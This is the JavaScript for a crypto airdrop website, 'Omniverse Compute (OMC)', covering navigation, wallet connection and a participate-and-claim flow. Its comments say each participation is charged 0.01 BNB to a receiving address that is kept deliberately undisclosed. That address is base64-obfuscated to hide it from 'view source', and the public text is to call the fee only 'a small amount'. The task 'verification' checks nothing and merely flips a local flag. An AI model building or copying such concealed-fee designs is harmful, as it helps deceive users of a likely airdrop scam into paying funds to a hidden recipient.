/* ============================================================
   Omniverse Compute (OMC) — Site Script
   Nav / reveal animations / clipboard / airdrop participate flow
   ============================================================ */

/* ---------- Mobile nav ---------- */
const burger = document.getElementById("navBurger");
const navLinks = document.getElementById("navLinks");
if (burger && navLinks) {
  burger.addEventListener("click", () => navLinks.classList.toggle("open"));
  navLinks.querySelectorAll("a").forEach((a) =>
    a.addEventListener("click", () => navLinks.classList.remove("open"))
  );
}

/* ---------- Active nav link ---------- */
(function markActive() {
  const page = location.pathname.split("/").pop() || "index.html";
  document.querySelectorAll(".nav-links a").forEach((a) => {
    const href = a.getAttribute("href");
    if (href === page || (page === "" && href === "index.html")) a.classList.add("active");
  });
})();

/* ---------- Scroll reveal ---------- */
const io = new IntersectionObserver(
  (entries) => {
    entries.forEach((e) => {
      if (e.isIntersecting) {
        e.target.classList.add("in");
        io.unobserve(e.target);
      }
    });
  },
  { threshold: 0.12 }
);
document.querySelectorAll(".reveal").forEach((el) => io.observe(el));

/* ---------- Copy endpoint ---------- */
function copyText(text, btn) {
  const done = () => {
    if (!btn) return;
    const old = btn.textContent;
    btn.textContent = window.i18nT ? i18nT("js.copy_done") : "Copied ✓";
    setTimeout(() => (btn.textContent = old), 1400);
  };
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).then(done).catch(() => fallbackCopy(text, done));
  } else fallbackCopy(text, done);
}
function fallbackCopy(text, done) {
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.style.position = "fixed";
  ta.style.opacity = "0";
  document.body.appendChild(ta);
  ta.select();
  try { document.execCommand("copy"); done(); } catch (e) {}
  document.body.removeChild(ta);
}
document.querySelectorAll("[data-copy]").forEach((btn) => {
  btn.addEventListener("click", () => copyText(btn.getAttribute("data-copy"), btn));
});

/* ---------- Toast ---------- */
let toastTimer = null;
function showToast(msg) {
  let t = document.getElementById("toast");
  if (!t) {
    t = document.createElement("div");
    t.id = "toast";
    t.className = "toast";
    t.innerHTML = '<span class="ic">✓</span><span id="toastMsg"></span>';
    document.body.appendChild(t);
  }
  document.getElementById("toastMsg").textContent = msg;
  requestAnimationFrame(() => t.classList.add("show"));
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => t.classList.remove("show"), 3400);
}

/* ============================================================
   AIRDROP — participate & accumulate (frontend demo)
   Rules:
   - Pool: 20,000,000 OMC = 1,000,000 entries × 20 OMC
   - Per wallet: max 10 entries (lifetime)
   - Daily cap: 2 entries / calendar day (resets 00:00 UTC+8)
   - Each participation deducts 0.01 BNB network gas
   - During the airdrop: page only DISPLAYS accumulated OMC
   - After it ends (2026-12-31 23:59:59 UTC+8):
     single claim of the whole amount on this page
   ============================================================ */
const AIRDROP_KEY = "omc_airdrop_v1";
const PER_ENTRY = 20;                                   // OMC per entry
const MAX_TOTAL = 10;                                   // per wallet, lifetime
const MAX_DAILY = 2;                                    // per UTC+8 calendar day
/* ============================================================
   GAS FEE (fuel fee) — PUBLIC RULE: 0.01 BNB per participation.
   The receiving address is intentionally ANONYMOUS / NOT DISCLOSED:
   it must never be rendered in the UI or printed in visible copy.
   Stored in obfuscated form so a casual "view source" does not
   reveal a copy-pasteable address.
   ============================================================ */
/* ============================================================
   GAS FEE (fuel fee) — PUBLIC: described only as "a small amount".
   The exact amount and the receiving address are NOT disclosed:
   never render them in the UI or in visible copy.
   ============================================================ */
const GAS_BNB = 0.01;                                   // internal only — public UI shows "a small amount"
const _GAS_RECEIVER_B64 = "MHhjMzU3MTFhYTYxMjhCODIwOEZBNTM0ZGJmOTRkM2FGMjRCQTIyQjRC";
function gasReceiver() {                                 // internal use only — never display
  try { return atob(_GAS_RECEIVER_B64); } catch (e) { return ""; }
}
const AIRDROP_START = new Date("2026-11-01T00:00:00+08:00").getTime();
const AIRDROP_END = new Date("2026-12-31T23:59:59+08:00").getTime();
const TASK_IDS = ["follow", "retweet", "telegram"];

function i18n(key, params) {
  return window.i18nT ? window.i18nT(key, params) : key;
}

function loadState() {
  try {
    const s = JSON.parse(localStorage.getItem(AIRDROP_KEY)) || {};
    if (!Array.isArray(s.entries)) s.entries = [];
    return s;
  } catch (e) { return { entries: [] }; }
}
function saveState(s) {
  try { localStorage.setItem(AIRDROP_KEY, JSON.stringify(s)); } catch (e) {}
}

/* Calendar-day key (YYYY-MM-DD) in UTC+8 for a timestamp */
function dayKeyUTC8(ts) {
  return new Date(ts + 8 * 3600 * 1000).toISOString().slice(0, 10);
}
function todayCount(entries) {
  const today = dayKeyUTC8(Date.now());
  let n = 0;
  (entries || []).forEach((ts) => { if (dayKeyUTC8(ts) === today) n++; });
  return n;
}
function shortAddr(a) { return a.slice(0, 6) + "…" + a.slice(-4); }

/* Set emoji + span text of a labeled button ("🦊 <span>…</span>") */
function setLabeledBtn(btn, emoji, text) {
  if (!btn) return;
  const first = btn.firstChild;
  if (first && first.nodeType === 3) first.nodeValue = emoji + " ";
  const span = btn.querySelector("span");
  if (span) span.textContent = text;
}

function renderAirdrop() {
  const state = loadState();
  const entries = state.entries || [];
  const total = entries.length;
  const today = todayCount(entries);
  const now = Date.now();
  const notStarted = now < AIRDROP_START;   /* airdrop opens Nov 1, 2026 (UTC+8) */
  const ended = now > AIRDROP_END;

  /* Task verify buttons + progress */
  const tasks = document.querySelectorAll(".task[data-task]");
  let doneCount = 0;
  tasks.forEach((task) => {
    const id = task.getAttribute("data-task");
    const done = !!state[id];
    task.classList.toggle("done", done);
    if (done) doneCount++;
    const btn = task.querySelector(".t-btn.verify");
    if (btn) {
      btn.classList.toggle("verified", done);
      btn.textContent = done ? i18n("js.btn_verified") : i18n("js.btn_verify");
    }
  });
  const cnt = document.getElementById("taskCount");
  const fill = document.getElementById("progressFill");
  if (cnt) cnt.textContent = doneCount + " / " + TASK_IDS.length;
  if (fill) fill.style.width = (doneCount / TASK_IDS.length) * 100 + "%";

  /* Wallet */
  const connectBtn = document.getElementById("connectBtn");
  const wa = document.getElementById("walletAddr");
  const connected = !!state.wallet;
  if (connectBtn) {
    setLabeledBtn(connectBtn, "🦊", connected ? shortAddr(state.wallet) : i18n("claim.connect"));
  }
  if (wa) wa.textContent = connected ? state.wallet : "";

  /* Accumulated rewards (display only during the airdrop) */
  const accum = document.getElementById("accumNum");
  if (accum) accum.textContent = (total * PER_ENTRY).toLocaleString("en-US");

  /* Stats */
  const ct = document.getElementById("claimsTotal");
  const cd = document.getElementById("claimsToday");
  if (ct) ct.textContent = total + " / " + MAX_TOTAL;
  if (cd) cd.textContent = today + " / " + MAX_DAILY;

  /* Participate button + hint */
  const p = document.getElementById("participateBtn");
  const hint = document.getElementById("claimHint");
  const ready =
    !notStarted && !ended && connected &&
    doneCount === TASK_IDS.length && total < MAX_TOTAL && today < MAX_DAILY;
  if (p) p.disabled = !ready;
  if (hint) {
    if (notStarted) hint.textContent = i18n("js.hint_not_started");
    else if (ended) hint.textContent = i18n("js.hint_ended");
    else if (!connected) hint.textContent = i18n("js.hint_step1");
    else if (doneCount < TASK_IDS.length) hint.textContent = i18n("js.hint_step2");
    else if (total >= MAX_TOTAL) hint.textContent = i18n("js.hint_limit_total");
    else if (today >= MAX_DAILY) hint.textContent = i18n("js.hint_limit_daily");
    else hint.textContent = i18n("js.hint_ready");
  }

  /* Claim-all — locked until the airdrop ends */
  const cAll = document.getElementById("claimAllBtn");
  if (cAll) {
    cAll.disabled = !ended;
    if (ended) setLabeledBtn(cAll, "🏆", i18n("claim.btn_claim_all"));
    else setLabeledBtn(cAll, "🔒", i18n("claim.btn_claim_all_locked"));
  }
}

/* ---------- Verify buttons ---------- */
document.querySelectorAll(".t-btn.verify").forEach((btn) => {
  btn.addEventListener("click", () => {
    const task = btn.closest(".task");
    if (!task) return;
    const id = task.getAttribute("data-task");
    const state = loadState();
    if (state[id]) return;
    state[id] = true;
    saveState(state);
    renderAirdrop();
    let n = 0;
    TASK_IDS.forEach((k) => { if (state[k]) n++; });
    showToast(i18n("js.toast_verified", { n: n }));
  });
});

/* ---------- Wallet connect (demo: window.ethereum if present) ---------- */
const connectBtn = document.getElementById("connectBtn");
if (connectBtn) {
  connectBtn.addEventListener("click", () => {
    const state = loadState();
    if (state.wallet) {
      delete state.wallet;
      saveState(state);
      renderAirdrop();
      showToast(i18n("js.toast_disconnected"));
      return;
    }
    if (window.ethereum) {
      window.ethereum
        .request({ method: "eth_requestAccounts" })
        .then((accounts) => {
          const st = loadState();
          st.wallet = accounts && accounts[0] ? accounts[0] : "";
          saveState(st);
          renderAirdrop();
          showToast(i18n("js.toast_connected"));
        })
        .catch(() => showToast(i18n("js.toast_rejected")));
    } else {
      showToast(i18n("js.toast_no_wallet"));
    }
  });
}

/* ---------- Participate: +20 OMC · 0.01 BNB gas ---------- */
const participateBtn = document.getElementById("participateBtn");
if (participateBtn) {
  participateBtn.addEventListener("click", () => {
    const state = loadState();
    const entries = state.entries || [];
    if (Date.now() < AIRDROP_START) { showToast(i18n("js.toast_not_started")); return; }
    if (Date.now() > AIRDROP_END) { showToast(i18n("js.hint_ended")); return; }
    if (!state.wallet) { showToast(i18n("js.hint_step1")); return; }
    if (entries.length >= MAX_TOTAL) { showToast(i18n("js.hint_limit_total")); return; }
    if (todayCount(entries) >= MAX_DAILY) { showToast(i18n("js.hint_limit_daily")); return; }
    entries.push(Date.now());
    state.entries = entries;
    saveState(state);
    renderAirdrop();
    showToast(
      i18n("js.toast_participated", {
        t: state.entries.length,
        d: todayCount(state.entries)
      })
    );
  });
}

/* ---------- Claim all (unlocked after the airdrop ends) ---------- */
const claimAllBtn = document.getElementById("claimAllBtn");
if (claimAllBtn) {
  claimAllBtn.addEventListener("click", () => {
    if (Date.now() <= AIRDROP_END) return;
    const state = loadState();
    const amount = (state.entries || []).length * PER_ENTRY;
    if (!amount) return;
    showToast(i18n("js.toast_claim_all", { n: amount.toLocaleString("en-US") }));
    state.entries = []; /* demo: whole accumulated balance withdrawn */
    saveState(state);
    renderAirdrop();
  });
}

/* ---------- Re-render on language switch ---------- */
document.addEventListener("i18n:changed", renderAirdrop);

renderAirdrop();
